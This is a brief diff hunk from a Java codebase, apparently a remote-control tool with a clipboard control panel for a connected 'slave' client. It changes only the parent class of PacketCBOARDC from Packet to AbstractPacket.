@@ -4,7 +4,7 @@ import com.redpois0n.Slave;
 import com.redpois0n.ui.frames.FrameControlPanel;
 import com.redpois0n.ui.panels.PanelControlClipboard;
 
-public class PacketCBOARDC extends Packet {
+public class PacketCBOARDC extends AbstractPacket {
 
 	@Override
 	public void read(Slave slave, String line) throws Exception {
